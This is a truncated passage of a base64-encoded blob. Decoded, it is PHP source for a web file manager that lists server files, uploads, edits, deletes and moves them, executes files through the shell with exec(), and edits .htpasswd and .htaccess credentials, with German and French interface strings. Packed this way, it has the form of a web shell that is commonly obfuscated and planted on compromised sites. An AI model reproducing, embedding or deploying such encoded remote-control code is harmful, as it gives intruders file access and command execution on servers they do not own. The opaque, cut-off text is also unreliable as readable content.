VwiZ3JvdXBcIj57JGZpbGVbJ2dyb3VwJ119PC90ZD5cbiI7DQoJCQl9DQoNCgkJfQ0KDQoJCWVjaG8gJwk8dGQgY2xhc3M9ImZ1bmN0aW9ucyI+DQoJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImZpbGUnIC4gJGkgLiAnIiB2YWx1ZT0iJyAuIGh0bWwoJGZpbGVbJ3BhdGgnXSkgLiAnIiAvPg0KJzsNCg0KCQkkYWN0aW9ucyA9IGFycmF5KCk7DQoJCWlmIChmdW5jdGlvbl9leGlzdHMoJ3N5bWxpbmsnKSkgew0KCQkJJGFjdGlvbnNbXSA9ICdjcmVhdGVfc3ltbGluayc7DQoJCX0NCgkJaWYgKEBpc193cml0YWJsZShkaXJuYW1lKCRmaWxlWydwYXRoJ10pKSkgew0KCQkJJGFjdGlvbnNbXSA9ICdkZWxldGUnOw0KCQkJJGFjdGlvbnNbXSA9ICdyZW5hbWUnOw0KCQkJJGFjdGlvbnNbXSA9ICdtb3ZlJzsNCgkJfQ0KCQlpZiAoJGZpbGVbJ2lzX2ZpbGUnXSAmJiAkZmlsZVsnaXNfcmVhZGFibGUnXSkgew0KCQkJJGFjdGlvbnNbXSA9ICdjb3B5JzsNCgkJCSRhY3Rpb25zW10gPSAnZG93bmxvYWQnOw0KCQkJaWYgKCRmaWxlWydpc193cml0YWJsZSddKSAkYWN0aW9uc1tdID0gJ2VkaXQnOw0KCQl9DQoJCWlmICghJHdpbiAmJiBmdW5jdGlvbl9leGlzdHMoJ2V4ZWMnKSAmJiAkZmlsZVsnaXNfZmlsZSddICYmICRmaWxlWydpc19leGVjdXRhYmxlJ10gJiYgZmlsZV9leGlzdHMoJy9iaW4vc2gnKSkgew0KCQkJJGFjdGlvbnNbXSA9ICdleGVjdXRlJzsNCgkJfQ0KDQoJCWlmIChzaXplb2YoJGFjdGlvbnMpID4gMCkgew0KDQoJCQllY2hvICcJCTxzZWxlY3QgY2xhc3M9InNtYWxsIiBuYW1lPSJhY3Rpb24nIC4gJGkgLiAnIiBzaXplPSIxIj4NCgkJPG9wdGlvbiB2YWx1ZT0iIj4nIC4gc3RyX3JlcGVhdCgnJm5ic3A7JywgMzApIC4gJzwvb3B0aW9uPg0KJzsNCg0KCQkJZm9yZWFjaCAoJGFjdGlvbnMgYXMgJGFjdGlvbikgew0KCQkJCWVjaG8gIlx0XHQ8b3B0aW9uIHZhbHVlPVwiJGFjdGlvblwiPiIgLiB3b3JkKCRhY3Rpb24pIC4gIjwvb3B0aW9uPlxuIjsNCgkJCX0NCg0KCQkJZWNobyAnCQk8L3NlbGVjdD4NCgkJPGlucHV0IGNsYXNzPSJzbWFsbCIgdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXQnIC4gJGkgLiAnIiB2YWx1ZT0iICZndDsgIiBvbmZvY3VzPSJhY3RpdmF0ZShcJ290aGVyXCcpIiAvPg0KJzsNCg0KCQl9DQoNCgkJZWNobyAnCTwvdGQ+DQo8L3RyPg0KJzsNCg0KCX0NCg0KCWVjaG8gJzx0ciBjbGFzcz0ibGlzdGluZ19mb290ZXIiPg0KCTx0ZCBzdHlsZT0idGV4dC1hbGlnbjogcmlnaHQ7IHZlcnRpY2FsLWFsaWduOiB0b3AiPjxpbWcgc3JjPSInIC4gJHNlbGYgLiAnP2ltYWdlPWFycm93IiBhbHQ9IiZndDsiIC8+PC90ZD4NCgk8dGQgY29sc3Bhbj0iJyAuICgkY29scyAtIDEpIC4gJyI+DQoJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Im51bSIgdmFsdWU9IicgLiBzaXplb2YoJGxpc3QpIC4gJyIgLz4NCgkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZm9jdXMiIHZhbHVlPSIiIC8+DQoJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Im9sZGRpciIgdmFsdWU9IicgLiBodG1sKCRkaXJlY3RvcnkpIC4gJyIgLz4NCic7DQoNCgkkYWN0aW9ucyA9IGFycmF5KCk7DQoJaWYgKEBpc193cml0YWJsZShkaXJuYW1lKCRmaWxlWydwYXRoJ10pKSkgew0KCQkkYWN0aW9uc1tdID0gJ2RlbGV0ZSc7DQoJCSRhY3Rpb25zW10gPSAnbW92ZSc7DQoJfQ0KCSRhY3Rpb25zW10gPSAnY29weSc7DQoNCgllY2hvICcJCTxzZWxlY3QgY2xhc3M9InNtYWxsIiBuYW1lPSJhY3Rpb25fYWxsIiBzaXplPSIxIj4NCgkJPG9wdGlvbiB2YWx1ZT0iIj4nIC4gc3RyX3JlcGVhdCgnJm5ic3A7JywgMzApIC4gJzwvb3B0aW9uPg0KJzsNCg0KCWZvcmVhY2ggKCRhY3Rpb25zIGFzICRhY3Rpb24pIHsNCgkJZWNobyAiXHRcdDxvcHRpb24gdmFsdWU9XCIkYWN0aW9uXCI+IiAuIHdvcmQoJGFjdGlvbikgLiAiPC9vcHRpb24+XG4iOw0KCX0NCg0KCWVjaG8gJwkJPC9zZWxlY3Q+DQoJCTxpbnB1dCBjbGFzcz0ic21hbGwiIHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0X2FsbCIgdmFsdWU9IiAmZ3Q7ICIgb25mb2N1cz0iYWN0aXZhdGUoXCdvdGhlclwnKSIgLz4NCgk8L3RkPg0KPC90cj4NCic7DQoNCn0NCg0KZnVuY3Rpb24gY29sdW1uX3RpdGxlICgkY29sdW1uLCAkc29ydCwgJHJldmVyc2UpIHsNCglnbG9iYWwgJHNlbGYsICRkaXJlY3Rvcnk7DQoNCgkkZCA9ICdkaXI9JyAuIHVybGVuY29kZSgkZGlyZWN0b3J5KSAuICcmYW1wOyc7DQoNCglpZiAoJHNvcnQgPT0gJGNvbHVtbikgew0KCQlpZiAoISRyZXZlcnNlKSB7DQoJCQkkciA9ICcmYW1wO3JldmVyc2U9dHJ1ZSc7DQoJCQkkYXJyID0gJyAmYW5kOyc7DQoJCX0gZWxzZSB7DQoJCQkkYXJyID0gJyAmb3I7JzsNCgkJfQ0KCX0gZWxzZSB7DQoJCSRyID0gJyc7DQoJfQ0KCWdsb2JhbCAkYXJyOw0KCWVjaG8gIlx0PHRoIGNsYXNzPVwiJGNvbHVtblwiPjxhIGhyZWY9XCIkc2VsZj97JGR9c29ydD0kY29sdW1uJHJcIj4iIC4gd29yZCgkY29sdW1uKSAuICI8L2E+JGFycjwvdGg+XG4iOw0KDQp9DQoNCmZ1bmN0aW9uIGRpcmVjdG9yeV9jaG9pY2UgKCkgew0KCWdsb2JhbCAkZGlyZWN0b3J5LCAkaG9tZWRpciwgJGNvbHMsICRzZWxmOw0KDQoJZWNobyAnPHRyPg0KCTx0ZCBjb2xzcGFuPSInIC4gJGNvbHMgLiAnIiBpZD0iZGlyZWN0b3J5Ij4NCgkJPGEgaHJlZj0iJyAuICRzZWxmIC4gJz9kaXI9JyAuIHVybGVuY29kZSgkaG9tZWRpcikgLiAnIj4nIC4gd29yZCgnZGlyZWN0b3J5JykgLiAnPC9hPjoNCgkJPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImRpciIgc2l6ZT0iJyAuIHRleHRmaWVsZHNpemUoJGRpcmVjdG9yeSkgLiAnIiB2YWx1ZT0iJyAuIGh0bWwoJGRpcmVjdG9yeSkgLiAnIiBvbmZvY3VzPSJhY3RpdmF0ZShcJ2RpcmVjdG9yeVwnKSIgLz4NCgkJPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0iY2hhbmdlZGlyIiB2YWx1ZT0iJyAuIHdvcmQoJ2NoYW5nZScpIC4gJyIgb25mb2N1cz0iYWN0aXZhdGUoXCdkaXJlY3RvcnlcJykiIC8+DQoJPC90ZD4NCjwvdHI+DQonOw0KDQp9DQoNCmZ1bmN0aW9uIHVwbG9hZF9ib3ggKCkgew0KCWdsb2JhbCAkY29sczsNCg0KCWVjaG8gJzx0cj4NCgk8dGQgY29sc3Bhbj0iJyAuICRjb2xzIC4gJyIgaWQ9InVwbG9hZCI+DQoJCScgLiB3b3JkKCdmaWxlJykgLiAnOg0KCQk8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0idXBsb2FkIiBvbmZvY3VzPSJhY3RpdmF0ZShcJ290aGVyXCcpIiAvPg0KCQk8aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXRfdXBsb2FkIiB2YWx1ZT0iJyAuIHdvcmQoJ3VwbG9hZCcpIC4gJyIgb25mb2N1cz0iYWN0aXZhdGUoXCdvdGhlclwnKSIgLz4NCgk8L3RkPg0KPC90cj4NCic7DQoNCn0NCg0KZnVuY3Rpb24gY3JlYXRlX2JveCAoKSB7DQoJZ2xvYmFsICRjb2xzOw0KDQoJZWNobyAnPHRyPg0KCTx0ZCBjb2xzcGFuPSInIC4gJGNvbHMgLiAnIiBpZD0iY3JlYXRlIj4NCgkJPHNlbGVjdCBuYW1lPSJjcmVhdGVfdHlwZSIgc2l6ZT0iMSIgb25mb2N1cz0iYWN0aXZhdGUoXCdjcmVhdGVcJykiPg0KCQk8b3B0aW9uIHZhbHVlPSJmaWxlIj4nIC4gd29yZCgnZmlsZScpIC4gJzwvb3B0aW9uPg0KCQk8b3B0aW9uIHZhbHVlPSJkaXJlY3RvcnkiPicgLiB3b3JkKCdkaXJlY3RvcnknKSAuICc8L29wdGlvbj4NCgkJPC9zZWxlY3Q+DQoJCTxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJjcmVhdGVfbmFtZSIgb25mb2N1cz0iYWN0aXZhdGUoXCdjcmVhdGVcJykiIC8+DQoJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdF9jcmVhdGUiIHZhbHVlPSInIC4gd29yZCgnY3JlYXRlJykgLiAnIiBvbmZvY3VzPSJhY3RpdmF0ZShcJ2NyZWF0ZVwnKSIgLz4NCgk8L3RkPg0KPC90cj4NCic7DQoNCn0NCg0KZnVuY3Rpb24gZWRpdCAoJGZpbGUpIHsNCglnbG9iYWwgJHNlbGYsICRkaXJlY3RvcnksICRlZGl0Y29scywgJGVkaXRyb3dzLCAkYXBhY2hlLCAkaHRwYXNzd2QsICRodGFjY2VzczsNCg0KCWh0bWxfaGVhZGVyKCk7DQoNCgllY2hvICc8aDIgc3R5bGU9Im1hcmdpbi1ib3R0b206IDNwdCI+JyAuIGh0bWwoJGZpbGUpIC4gJzwvaDI+DQoNCjxmb3JtIGFjdGlvbj0iJyAuICRzZWxmIC4gJyIgbWV0aG9kPSJwb3N0Ij4NCg0KPHRhYmxlIGNsYXNzPSJkaWFsb2ciPg0KPHRyPg0KPHRkIGNsYXNzPSJkaWFsb2ciPg0KDQoJPHRleHRhcmVhIG5hbWU9ImNvbnRlbnQiIGNvbHM9IicgLiAkZWRpdGNvbHMgLiAnIiByb3dzPSInIC4gJGVkaXRyb3dzIC4gJyIgV1JBUD0ib2ZmIj4nOw0KDQoJaWYgKGFycmF5X2tleV9leGlzdHMoJ2NvbnRlbnQnLCAkX1BPU1QpKSB7DQoJCWVjaG8gJF9QT1NUWydjb250ZW50J107DQoJfSBlbHNlIHsNCgkJJGYgPSBmb3BlbigkZmlsZSwgJ3InKTsNCgkJd2hpbGUgKCFmZW9mKCRmKSkgew0KCQkJZWNobyBodG1sKGZyZWFkKCRmLCA4MTkyKSk7DQoJCX0NCgkJZmNsb3NlKCRmKTsNCgl9DQoNCglpZiAoIWVtcHR5KCRfUE9TVFsndXNlciddKSkgew0KCQllY2hvICJcbiIgLiAkX1BPU1RbJ3VzZXInXSAuICc6JyAuIGNyeXB0KCRfUE9TVFsncGFzc3dvcmQnXSk7DQoJfQ0KCWlmICghZW1wdHkoJF9QT1NUWydiYXNpY19hdXRoJ10pKSB7DQoJCWlmICgkd2luKSB7DQoJCQkkYXV0aGZpbGUgPSBzdHJfcmVwbGFjZSgnXFwnLCAnLycsICRkaXJlY3RvcnkpIC4gJGh0cGFzc3dkOw0KCQl9IGVsc2Ugew0KCQkJJGF1dGhmaWxlID0gJGRpcmVjdG9yeSAuICRodHBhc3N3ZDsNCgkJfQ0KCQllY2hvICJcbkF1dGhUeXBlIEJhc2ljXG5BdXRoTmFtZSAmcXVvdDtSZXN0cmljdGVkIERpcmVjdG9yeSZxdW90O1xuIjsNCgkJZWNobyAnQXV0aFVzZXJGaWxlICZxdW90OycgLiBodG1sKCRhdXRoZmlsZSkgLiAiJnF1b3Q7XG4iOw0KCQllY2hvICdSZXF1aXJlIHZhbGlkLXVzZXInOw0KCX0NCg0KCWVjaG8gJzwvdGV4dGFyZWE+DQoNCgk8aHIgLz4NCic7DQoNCglpZiAoJGFwYWNoZSAmJiBiYXNlbmFtZSgkZmlsZSkgPT0gJGh0cGFzc3dkKSB7DQoJCWVjaG8gJw0KCScgLiB3b3JkKCd1c2VyJykgLiAnOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idXNlciIgLz4NCgknIC4gd29yZCgncGFzc3dvcmQnKSAuICc6IDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icGFzc3dvcmQiIC8+DQoJPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IicgLiB3b3JkKCdhZGQnKSAuICciIC8+DQoNCgk8aHIgLz4NCic7DQoNCgl9DQoNCglpZiAoJGFwYWNoZSAmJiBiYXNlbmFtZSgkZmlsZSkgPT0gJGh0YWNjZXNzKSB7DQoJCWVjaG8gJw0KCTxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9ImJhc2ljX2F1dGgiIHZhbHVlPSInIC4gd29yZCgnYWRkX2Jhc2ljX2F1dGgnKSAuICciIC8+DQoNCgk8aHIgLz4NCic7DQoNCgl9DQoNCgllY2hvICcNCgk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhY3Rpb24iIHZhbHVlPSJlZGl0IiAvPg0KCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImZpbGUiIHZhbHVlPSInIC4gaHRtbCgkZmlsZSkgLiAnIiAvPg0KCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImRpciIgdmFsdWU9IicgLiBodG1sKCRkaXJlY3RvcnkpIC4gJyIgLz4NCgk8aW5wdXQgdHlwZT0icmVzZXQiIHZhbHVlPSInIC4gd29yZCgncmVzZXQnKSAuICciIGlkPSJyZWRfYnV0dG9uIiAvPg0KCTxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9InNhdmUiIHZhbHVlPSInIC4gd29yZCgnc2F2ZScpIC4gJyIgaWQ9ImdyZWVuX2J1dHRvbiIgc3R5bGU9Im1hcmdpbi1sZWZ0OiA1MHB4IiAvPg0KDQo8L3RkPg0KPC90cj4NCjwvdGFibGU+DQoNCjxwPjxhIGhyZWY9IicgLiAkc2VsZiAuICc/ZGlyPScgLiB1cmxlbmNvZGUoJGRpcmVjdG9yeSkgLiAnIj5bICcgLiB3b3JkKCdiYWNrJykgLiAnIF08L2E+PC9wPg0KDQo8L2Zvcm0+DQoNCic7DQoNCglodG1sX2Zvb3RlcigpOw0KDQp9DQoNCmZ1bmN0aW9uIHNwYWNlciAoKSB7DQoJZ2xvYmFsICRjb2xzOw0KDQoJZWNobyAnPHRyPg0KCTx0ZCBjb2xzcGFuPSInIC4gJGNvbHMgLiAnIiBzdHlsZT0iaGVpZ2h0OiAxZW0iPjwvdGQ+DQo8L3RyPg0KJzsNCg0KfQ0KDQpmdW5jdGlvbiB0ZXh0ZmllbGRzaXplICgkY29udGVudCkgew0KDQoJJHNpemUgPSBzdHJsZW4oJGNvbnRlbnQpICsgNTsNCglpZiAoJHNpemUgPCAzMCkgJHNpemUgPSAzMDsNCg0KCXJldHVybiAkc2l6ZTsNCg0KfQ0KDQpmdW5jdGlvbiByZXF1ZXN0X2R1bXAgKCkgew0KDQoJZm9yZWFjaCAoJF9SRVFVRVNUIGFzICRrZXkgPT4gJHZhbHVlKSB7DQoJCWVjaG8gIlx0PGlucHV0IHR5cGU9XCJoaWRkZW5cIiBuYW1lPVwiIiAuIGh0bWwoJGtleSkgLiAnIiB2YWx1ZT0iJyAuIGh0bWwoJHZhbHVlKSAuICJcIiAvPlxuIjsNCgl9DQoNCn0NCg0KLyogLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSAqLw0KDQpmdW5jdGlvbiBodG1sICgkc3RyaW5nKSB7DQoJZ2xvYmFsICRzaXRlX2NoYXJzZXQ7DQoJcmV0dXJuIGh0bWxlbnRpdGllcygkc3RyaW5nLCBFTlRfQ09NUEFULCAkc2l0ZV9jaGFyc2V0KTsNCn0NCg0KZnVuY3Rpb24gd29yZCAoJHdvcmQpIHsNCglnbG9iYWwgJHdvcmRzLCAkd29yZF9jaGFyc2V0Ow0KCXJldHVybiBodG1sZW50aXRpZXMoJHdvcmRzWyR3b3JkXSwgRU5UX0NPTVBBVCwgJHdvcmRfY2hhcnNldCk7DQp9DQoNCmZ1bmN0aW9uIHBocmFzZSAoJHBocmFzZSwgJGFyZ3VtZW50cykgew0KCWdsb2JhbCAkd29yZHM7DQoJc3RhdGljICRzZWFyY2g7DQoNCglpZiAoIWlzX2FycmF5KCRzZWFyY2gpKSBmb3IgKCRpID0gMTsgJGkgPD0gODsgJGkrKykgJHNlYXJjaFtdID0gIiUkaSI7DQoNCglmb3IgKCRpID0gMDsgJGkgPCBzaXplb2YoJGFyZ3VtZW50cyk7ICRpKyspIHsNCgkJJGFyZ3VtZW50c1skaV0gPSBubDJicihodG1sKCRhcmd1bWVudHNbJGldKSk7DQoJfQ0KDQoJJHJlcGxhY2UgPSBhcnJheSgneycgPT4gJzxwcmU+JywgJ30nID0+JzwvcHJlPicsICdbJyA9PiAnPGI+JywgJ10nID0+ICc8L2I+Jyk7DQoNCglyZXR1cm4gc3RyX3JlcGxhY2UoJHNlYXJjaCwgJGFyZ3VtZW50cywgc3RyX3JlcGxhY2UoYXJyYXlfa2V5cygkcmVwbGFjZSksICRyZXBsYWNlLCBubDJicihodG1sKCR3b3Jkc1skcGhyYXNlXSkpKSk7DQoNCn0NCg0KZnVuY3Rpb24gZ2V0d29yZHMgKCRsYW5nKSB7DQoJZ2xvYmFsICR3b3JkX2NoYXJzZXQsICRkYXRlX2Zvcm1hdDsNCg0KCXN3aXRjaCAoJGxhbmcpIHsNCgljYXNlICdkZSc6DQoNCgkJJGRhdGVfZm9ybWF0ID0gJ2QubS55IEg6aTpzJzsNCgkJJHdvcmRfY2hhcnNldCA9ICdJU08tODg1OS0xJzsNCg0KCQlyZXR1cm4gYXJyYXkoDQonZGlyZWN0b3J5JyA9PiAnVmVyemVpY2huaXMnLA0KJ2ZpbGUnID0+ICdEYXRlaScsDQonZmlsZW5hbWUnID0+ICdEYXRlaW5hbWUnLA0KDQonc2l6ZScgPT4gJ0dyPz9lJywNCidwZXJtaXNzaW9uJyA9PiAnUmVjaHRlJywNCidvd25lcicgPT4gJ0VpZ25lcicsDQonZ3JvdXAnID0+ICdHcnVwcGUnLA0KJ290aGVyJyA9PiAnQW5kZXJlJywNCidmdW5jdGlvbnMnID0+ICdGdW5rdGlvbmVuJywNCg0KJ3JlYWQnID0+ICdsZXNlbicsDQond3JpdGUnID0+ICdzY2hyZWliZW4nLA0KJ2V4ZWN1dGUnID0+ICdhdXNmPz9yZW4nLA0KDQonY3JlYXRlX3N5bWxpbmsnID0+ICdTeW1saW5rIGVyc3RlbGxlbicsDQonZGVsZXRlJyA9PiAnbD9zY2hlbicsDQoncmVuYW1lJyA9PiAndW1iZW5lbm5lbicsDQonbW92ZScgPT4gJ3ZlcnNjaGllYmVuJywNCidjb3B5JyA9PiAna29waWVyZW4nLA0KJ2VkaXQnID0+ICdlZGl0aWVyZW4nLA0KJ2Rvd25sb2FkJyA9PiAnaGVydW50ZXJsYWRlbicsDQondXBsb2FkJyA9PiAnaG9jaGxhZGVuJywNCidjcmVhdGUnID0+ICdlcnN0ZWxsZW4nLA0KJ2NoYW5nZScgPT4gJ3dlY2hzZWxuJywNCidzYXZlJyA9PiAnc3BlaWNoZXJuJywNCidzZXQnID0+ICdzZXR6ZScsDQoncmVzZXQnID0+ICd6dXI/P2tzZXR6ZW4nLA0KJ3JlbGF0aXZlJyA9PiAnUGZhZCB6dW0gWmllbCByZWxhdGl2JywNCg0KJ3llcycgPT4gJ0phJywNCidubycgPT4gJ05laW4nLA0KJ2JhY2snID0+ICd6dXI/P2snLA0KJ2Rlc3RpbmF0aW9uJyA9PiAnWmllbCcsDQonc3ltbGluaycgPT4gJ1N5bWJvbGlzY2hlciBMaW5rJywNCidub19vdXRwdXQnID0+ICdrZWluZSBBdXNnYWJlJywNCg0KJ3VzZXInID0+ICdCZW51dHplcm5hbWUnLA0KJ3Bhc3N3b3JkJyA9PiAnS2VubndvcnQnLA0KJ2FkZCcgPT4gJ2hpbnp1Zj9lbicsDQonYWRkX2Jhc2ljX2F1dGgnID0+ICdIVFRQLUJhc2ljLUF1dGggaGluenVmP2VuJywNCg0KJ3VwbG9hZGVkJyA9PiAnIlslMV0iIHd1cmRlIGhvY2hnZWxhZGVuLicsDQonbm90X3VwbG9hZGVkJyA9PiAnIlslMV0iIGtvbm50ZSBuaWNodCBob2NoZ2VsYWRlbiB3ZXJkZW4uJywNCidhbHJlYWR5X2V4aXN0cycgPT4gJyJbJTFdIiBleGlzdGllcnQgYmVyZWl0cy4nLA0KJ2NyZWF0ZWQnID0+ICciWyUxXSIgd3VyZGUgZXJzdGVsbHQuJywNCidub3RfY3JlYXRlZCcgPT4gJyJbJTFdIiBrb25udGUgbmljaHQgZXJzdGVsbHQgd2VyZGVuLicsDQoncmVhbGx5X2RlbGV0ZScgPT4gJ1NvbGxlbiBmb2xnZW5kZSBEYXRlaWVuIHdpcmtsaWNoIGdlbD9zY2h0IHdlcmRlbj8nLA0KJ2RlbGV0ZWQnID0+ICJGb2xnZW5kZSBEYXRlaWVuIHd1cmRlbiBnZWw/c2NodDpcblslMV0iLA0KJ25vdF9kZWxldGVkJyA9PiAiRm9sZ2VuZGUgRGF0ZWllbiBrb25udGVuIG5pY2h0IGdlbD9zY2h0IHdlcmRlbjpcblslMV0iLA0KJ3JlbmFtZV9maWxlJyA9PiAnQmVuZW5uZSBEYXRlaSB1bTonLA0KJ3JlbmFtZWQnID0+ICciWyUxXSIgd3VyZGUgaW4gIlslMl0iIHVtYmVuYW5udC4nLA0KJ25vdF9yZW5hbWVkJyA9PiAnIlslMV0ga29ubnRlIG5pY2h0IGluICJbJTJdIiB1bWJlbmFubnQgd2VyZGVuLicsDQonbW92ZV9maWxlcycgPT4gJ1ZlcnNjaGllYmVuIGZvbGdlbmRlIERhdGVpZW46JywNCidtb3ZlZCcgPT4gIkZvbGdlbmRlIERhdGVpZW4gd3VyZGVuIG5hY2ggXCJbJTJdXCIgdmVyc2Nob2JlbjpcblslMV0iLA0KJ25vdF9tb3ZlZCcgPT4gIkZvbGdlbmRlIERhdGVpZW4ga29ubnRlbiBuaWNodCBuYWNoIFwiWyUyXVwiIHZlcnNjaG9iZW4gd2VyZGVuOlxuWyUxXSIsDQonY29weV9maWxlcycgPT4gJ0tvcGllcmUgZm9sZ2VuZGUgRGF0ZWllbjonLA0KJ2NvcGllZCcgPT4gIkZvbGdlbmRlIERhdGVpZW4gd3VyZGVuIG5hY2ggXCJbJTJdXCIga29waWVydDpcblslMV0iLA0KJ25vdF9jb3BpZWQnID0+ICJGb2xnZW5kZSBEYXRlaWVuIGtvbm50ZW4gbmljaHQgbmFjaCBcIlslMl1cIiBrb3BpZXJ0IHdlcmRlbjpcblslMV0iLA0KJ25vdF9lZGl0ZWQnID0+ICciWyUxXSIga2FubiBuaWNodCBlZGl0aWVydCB3ZXJkZW4uJywNCidleGVjdXRlZCcgPT4gIlwiWyUxXVwiIHd1cmRlIGVyZm9sZ3JlaWNoIGF1c2dlZj8/cnQ6XG57JTJ9IiwNCidub3RfZXhlY3V0ZWQnID0+ICJcIlslMV1cIiBrb25udGUgbmljaHQgZXJmb2xncmVpY2ggYXVzZ2VmPz9ydCB3ZXJkZW46XG57JTJ9IiwNCidzYXZlZCcgPT4gJyJbJTFdIiB3dXJkZSBnZXNwZWljaGVydC4nLA0KJ25vdF9zYXZlZCcgPT4gJyJbJTFdIiBrb25udGUgbmljaHQgZ2VzcGVpY2hlcnQgd2VyZGVuLicsDQonc3ltbGlua2VkJyA9PiAnU3ltYm9saXNjaGVyIExpbmsgdm9uICJbJTJdIiBuYWNoICJbJTFdIiB3dXJkZSBlcnN0ZWxsdC4nLA0KJ25vdF9zeW1saW5rZWQnID0+ICdTeW1ib2xpc2NoZXIgTGluayB2b24gIlslMl0iIG5hY2ggIlslMV0iIGtvbm50ZSBuaWNodCBlcnN0ZWxsdCB3ZXJkZW4uJywNCidwZXJtaXNzaW9uX2ZvcicgPT4gJ1JlY2h0ZSBmPyAiWyUxXSI6JywNCidwZXJtaXNzaW9uX3NldCcgPT4gJ0RpZSBSZWNodGUgZj8gIlslMV0iIHd1cmRlbiBhdWYgWyUyXSBnZXNldHp0LicsDQoncGVybWlzc2lvbl9ub3Rfc2V0JyA9PiAnRGllIFJlY2h0ZSBmPyAiWyUxXSIga29ubnRlbiBuaWNodCBhdWYgWyUyXSBnZXNldHp0IHdlcmRlbi4nLA0KJ25vdF9yZWFkYWJsZScgPT4gJyJbJTFdIiBrYW5uIG5pY2h0IGdlbGVzZW4gd2VyZGVuLicNCgkJKTsNCg0KCWNhc2UgJ2ZyJzoNCg0KCQkkZGF0ZV9mb3JtYXQgPSAnZC5tLnkgSDppOnMnOw0KCQkkd29yZF9jaGFyc2V0ID0gJ0lTTy04ODU5LTEnOw0KDQoJCXJldHVybiBhcnJheSgNCidkaXJlY3RvcnknID0+ICdSP2VydG9pcmUnLA0KJ2ZpbGUnID0+ICdGaWNoaWVyJywNCidmaWxlbmFtZScgPT4gJ05vbSBmaWNoaWVyJywNCg0KJ3NpemUnID0+ICdUYWlsbGUnLA0KJ3Blcm1pc3Npb24nID0+ICdEcm9pdHMnLA0KJ293bmVyJyA9PiAnUHJvcHJpP2FpcmUnLA0KJ2dyb3VwJyA9PiAnR3JvdXBlJywNCidvdGhlcicgPT4gJ0F1dHJlcycsDQonZnVuY3Rpb25zJyA9PiAnRm9uY3Rpb25zJywNCg0KJ3JlYWQnID0+ICdMaXJlJywNCid3cml0ZScgPT4gJ0VjcmlyZScsDQonZXhlY3V0ZScgPT4gJ0V4P3V0ZXInLA0KDQonY3JlYXRlX3N5bWxpbmsnID0+ICdDcj9yIGxpZW4gc3ltYm9saXF1ZScsDQonZGVsZXRlJyA9PiAnRWZmYWNlcicsDQoncmVuYW1lJyA9PiAnUmVub21tZXInLA0KJ21vdmUnID0+ICdEP2xhY2VyJywNCidjb3B5JyA9PiAnQ29waWVyJywNCidlZGl0JyA9PiAnT3V2cmlyJywNCidkb3dubG9hZCcgPT4gJ1Q/P2hhcmdlciBzdXIgUEMnLA0KJ3VwbG9hZCcgPT4gJ1Q/P2hhcmdlciBzdXIgc2VydmV1cicsDQonY3JlYXRlJyA9PiAnQ3I/cicsDQonY2hhbmdlJyA9PiAnQ2hhbmdlcicsDQonc2F2ZScgPT4gJ1NhdXZlZ2FyZGVyJywNCidzZXQnID0+ICdFeD91dGVyJywNCidyZXNldCcgPT4gJ1I/bml0aWFsaXNlcicsDQoncmVsYXRpdmUnID0+ICdSZWxhdGlmJywNCg0KJ3llcycgPT4gJ091aScsDQonbm8nID0+ICdOb24nLA0KJ2JhY2snID0+ICdSZXRvdXInLA0KJ2Rlc3RpbmF0aW9uJyA9PiAnRGVzdGluYXRpb24nLA0KJ3N5bWxpbmsnID0+ICdMaWVuIHN5bWJvbGxpcXVlJywNCidub19vdXRwdXQnID0+ICdQYXMgZGUgc29ydGllJywNCg0KJ3VzZXInID0+ICdVdGlsaXNhdGV1cicsDQoncGFzc3dvcmQnID0+ICdNb3QgZGUgcGFzc2UnLA0KJ2FkZCcgPT4gJ0Fqb3V0ZXInLA0KJ2FkZF9iYXNpY19hdXRoJyA9PiAnYWRkIGJhc2ljLWF1dGhlbnRpZmljYXRpb24nLA0KDQondXBsb2FkZWQnID0+ICciWyUxXSIgYSA/PyB0Pz9oYXJnPyBzdXIgbGUgc2VydmV1ci4nLA0KJ25vdF91cGxvYWRlZCcgPT4gJyJbJTFdIiBuIGEgcGFzID8/IHQ/P2hhcmc/IHN1ciBsZSBzZXJ2ZXVyLicsDQonYWxyZWFkeV9leGlzdHMnID0+ICciWyUxXSIgZXhpc3RlIGQ/Py4nLA0KJ2NyZWF0ZWQnID0+ICciWyUxXSIgYSA/PyBjcj8uJywNCidub3RfY3JlYXRlZCcgPT4gJyJbJTFdIiBuIGEgcGFzIHB1ID9yZSBjcj8uJywNCidyZWFsbHlfZGVsZXRlJyA9PiAnRWZmYWNlciBsZSBmaWNoaWVyPycsDQonZGVsZXRlZCcgPT4gIkNlcyBmaWNoaWVycyBvbnQgPz8gZD91aXRzOlxuWyUxXSIsDQonbm90X2RlbGV0ZWQnID0+ICJDZXMgZmljaGllcnMgbiBvbnQgcHUgP3JlIGQ/cnVpdHM6XG5bJTFdIiwNCidyZW5hbWVfZmlsZScgPT4gJ1Jlbm9tbWUgZmljaGllcjonLA0KJ3JlbmFtZWQnID0+ICciWyUxXSIgYSA/PyByZW5vbW0/IGVuICJbJTJdIi4nLA0KJ25vdF9yZW5hbWVkJyA9PiAnIlslMV0gbiBhIHBhcyBwdSA/cmUgcmVub21tPyBlbiAiWyUyXSIuJywNCidtb3ZlX2ZpbG